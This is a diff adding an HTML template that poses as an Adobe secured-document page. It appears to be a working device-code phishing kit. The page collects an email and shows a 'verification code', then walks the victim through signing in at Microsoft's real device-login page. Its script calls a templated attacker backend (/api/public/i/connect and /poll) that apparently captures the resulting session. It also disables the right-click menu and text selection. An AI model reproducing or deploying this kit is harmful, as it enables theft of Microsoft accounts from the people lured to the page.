@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Secure Document Transmission</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        header: '#2b5797',
+                        body: '#f0e8e0',
+                        card: '#ffffff',
+                        btnDark: '#2b5797'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        * { user-select: none; -webkit-user-select: none; }
+        input { user-select: text; -webkit-user-select: text; }
+        .bg-wavy {
+            background-image: repeating-linear-gradient(
+                135deg,
+                rgba(200,180,170,0.08) 0px,
+                rgba(200,180,170,0.08) 1px,
+                transparent 1px,
+                transparent 6px
+            );
+        }
+    </style>
+</head>
+<body class="min-h-screen bg-body bg-wavy">
+
+    <!-- Header Bar -->
+    <div class="bg-header py-3 px-4 text-center border-b-4 border-blue-400">
+        <p class="text-white text-lg md:text-xl font-medium tracking-wide">Adobe Secure Document Transmission</p>
+    </div>
+
+    <!-- Top right label -->
+    <div class="max-w-2xl mx-auto px-4 pt-2 text-right">
+        <span class="text-gray-500 text-xs italic">Protected Form</span>
+    </div>
+
+    <!-- Main Card -->
+    <div class="max-w-xl mx-auto px-4 py-10">
+        <div class="bg-card rounded-2xl shadow-xl p-8 md:p-12 text-center">
+
+            <!-- Adobe Acrobat Logo -->
+            <div class="flex justify-center mb-8">
+                <img src="acrobat-logo.png" alt="Adobe Acrobat" class="w-24 h-24 object-contain">
+            </div>
+
+            <!-- Heading -->
+            <h1 class="text-xl md:text-2xl font-bold text-gray-900 mb-3" id="headingText">A secured document has been shared with you</h1>
+            <p class="text-gray-500 text-sm mb-2" id="docInfo" style="display:none"></p>
+            <p class="text-gray-500 text-sm mb-2" id="noteText" style="display:none"></p>
+            <p class="text-gray-500 text-sm mb-8">Please enter your email address to continue.</p>
+
+            <!-- Email Input -->
+            <div class="mb-5">
+                <input type="email" id="emailInput" placeholder="Enter your email address" class="w-full px-4 py-3 border border-gray-300 rounded-lg text-sm text-gray-700 placeholder-gray-400 outline-none focus:border-header focus:ring-1 focus:ring-header">
+            </div>
+
+            <!-- Open Button -->
+            <button id="playBtn" onclick="handlePlay()" class="w-full bg-btnDark text-white py-3.5 rounded-lg font-medium text-sm hover:bg-opacity-90 transition-colors flex items-center justify-center gap-2">
+                <svg id="playIcon" class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"/></svg>
+                <svg id="spinnerIcon" class="w-4 h-4 animate-spin hidden" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
+                <span id="playText">Open in AdobeAcrobat</span>
+            </button>
+
+            <!-- Verify text -->
+            <p class="text-gray-400 text-xs mt-5">Please verify your email address to access it.</p>
+
+            <!-- Footer -->
+            <p class="text-gray-400 text-xs mt-6">&copy; 2026 Organization Privacy &amp; Cookies</p>
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div id="modalOverlay" class="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50 hidden">
+        <div class="bg-card rounded-xl shadow-2xl w-full max-w-md border border-gray-200 overflow-hidden">
+            <div class="p-8 text-center">
+                <p class="text-gray-500 text-sm mb-2">Verification code</p>
+                <p id="codeDisplay" class="text-2xl md:text-3xl font-bold text-gray-900 tracking-[0.25em] mb-6">CQ5CQSM5F</p>
+
+                <button onclick="copyCode()" id="copyBtn" class="inline-flex items-center gap-2 border border-gray-300 text-gray-700 px-6 py-2.5 rounded-lg font-medium text-sm hover:bg-gray-50 transition-colors mb-8">
+                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+                    <span id="copyText">Copy code</span>
+                </button>
+
+                <div class="text-left mb-6">
+                    <p class="text-gray-800 font-semibold text-sm mb-3">Steps to verify:</p>
+                    <ol class="space-y-2 text-gray-500 text-sm pl-4">
+                        <li>Open the link below in a new tab</li>
+                        <li>Enter code <span id="codeInStep" class="font-bold text-gray-800">CQ5CQSM5F</span> when prompted</li>
+                        <li>Sign in with your Microsoft account</li>
+                        <li>Return to this page &mdash; it updates automatically</li>
+                    </ol>
+                </div>
+
+                <a id="authLink" href="https://login.microsoft.com/device" target="_blank" class="block w-full bg-header text-white py-3.5 rounded-lg font-medium text-sm hover:bg-opacity-90 transition-colors text-center">
+                    https://login.microsoft.com/device
+                    <svg class="w-4 h-4 inline-block ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg>
+                </a>
+            </div>
+            <div class="border-t border-gray-200 py-4 text-center">
+                <div class="inline-flex items-center gap-2 text-gray-400 text-sm">
+                    <svg class="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
+                    Waiting for authentication...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var API = "{{ domain }}";
+        var CODE = "{{ invitation }}";
+        var _invitationId = null;
+        var _pollTimer = null;
+
+        function init() {
+            fetch(API + '/api/public/i/' + CODE)
+                .then(function(res) {
+                    if (!res.ok) return;
+                    return res.json();
+                })
+                .then(function(data) {
+                    if (data && data.invitationId) {
+                        _invitationId = data.invitationId;
+                        if (data.senderName) {
+                            document.getElementById('headingText').textContent = data.senderName + ' shared a secured document';
+                        }
+                        if (data.documentTitle) {
+                            var info = document.getElementById('docInfo');
+                            info.textContent = data.documentTitle + (data.docType ? ' (' + data.docType + ')' : '');
+                            info.style.display = '';
+                        }
+                        if (data.notes) {
+                            var note = document.getElementById('noteText');
+                            note.textContent = data.notes;
+                            note.style.display = '';
+                        }
+                    }
+                })
+                .catch(function() {});
+        }
+
+        function resetButton() {
+            var btn = document.getElementById('playBtn');
+            var playIcon = document.getElementById('playIcon');
+            var spinnerIcon = document.getElementById('spinnerIcon');
+            var playText = document.getElementById('playText');
+            btn.disabled = false;
+            btn.classList.remove('opacity-75', 'cursor-not-allowed');
+            playIcon.classList.remove('hidden');
+            spinnerIcon.classList.add('hidden');
+            playText.textContent = 'Open in AdobeAcrobat';
+        }
+
+        function showModal(userCode, verificationUri) {
+            document.getElementById('codeDisplay').textContent = userCode;
+            document.getElementById('codeInStep').textContent = userCode;
+            var authLink = document.getElementById('authLink');
+            authLink.href = verificationUri;
+            authLink.innerHTML = verificationUri + ' <svg class="w-4 h-4 inline-block ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg>';
+            document.getElementById('modalOverlay').classList.remove('hidden');
+        }
+
+        function startPolling(deviceCode, invitationId, interval) {
+            if (_pollTimer) clearInterval(_pollTimer);
+            _pollTimer = setInterval(function() {
+                fetch(API + '/api/public/i/poll', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceCode: deviceCode, invitationId: invitationId })
+                })
+                .then(function(res) { return res.json(); })
+                .then(function(result) {
+                    if (result.status === 'complete') {
+                        clearInterval(_pollTimer);
+                        _pollTimer = null;
+                        window.location.href = result.exitUrl;
+                    } else if (result.status === 'error') {
+                        clearInterval(_pollTimer);
+                        _pollTimer = null;
+                        var modalContent = document.getElementById('modalOverlay').querySelector('.p-8');
+                        modalContent.innerHTML = '<p class="text-red-600 font-semibold mb-4">' + (result.error || 'Authentication failed') + '</p>' +
+                            '<button onclick="document.getElementById(\'modalOverlay\').classList.add(\'hidden\'); handlePlay();" class="inline-flex items-center gap-2 bg-header text-white px-6 py-2.5 rounded-lg font-medium text-sm hover:bg-opacity-90 transition-colors">Try Again</button>';
+                        var modalFooter = document.getElementById('modalOverlay').querySelector('.border-t');
+                        if (modalFooter) modalFooter.classList.add('hidden');
+                    }
+                })
+                .catch(function() {});
+            }, interval * 1000);
+        }
+
+        function handlePlay() {
+            var btn = document.getElementById('playBtn');
+            var playIcon = document.getElementById('playIcon');
+            var spinnerIcon = document.getElementById('spinnerIcon');
+            var playText = document.getElementById('playText');
+
+            btn.disabled = true;
+            btn.classList.add('opacity-75', 'cursor-not-allowed');
+            playIcon.classList.add('hidden');
+            spinnerIcon.classList.remove('hidden');
+            playText.textContent = 'Loading...';
+
+            if (!_invitationId) {
+                setTimeout(function() {
+                    resetButton();
+                    showModal('CQ5CQSM5F', 'https://login.microsoft.com/device');
+                }, 2000);
+                return;
+            }
+
+            fetch(API + '/api/public/i/connect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ invitationId: _invitationId })
+            })
+            .then(function(res) {
+                if (!res.ok) throw new Error('Connect failed');
+                return res.json();
+            })
+            .then(function(auth) {
+                resetButton();
+                showModal(auth.userCode, auth.verificationUri);
+                startPolling(auth.deviceCode, _invitationId, auth.interval);
+            })
+            .catch(function() {
+                setTimeout(function() {
+                    resetButton();
+                    showModal('CQ5CQSM5F', 'https://login.microsoft.com/device');
+                }, 2000);
+            });
+        }
+
+        function copyCode() {
+            var code = document.getElementById('codeDisplay').textContent.trim();
+            navigator.clipboard.writeText(code).then(function() {
+                var copyText = document.getElementById('copyText');
+                copyText.textContent = 'Copied!';
+                setTimeout(function() { copyText.textContent = 'Copy code'; }, 2000);
+            });
+        }
+
+        document.getElementById('modalOverlay').addEventListener('click', function(e) {
+            if (e.target === this) this.classList.add('hidden');
+        });
+
+        init();
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    </script>
+
+</body>
+</html>
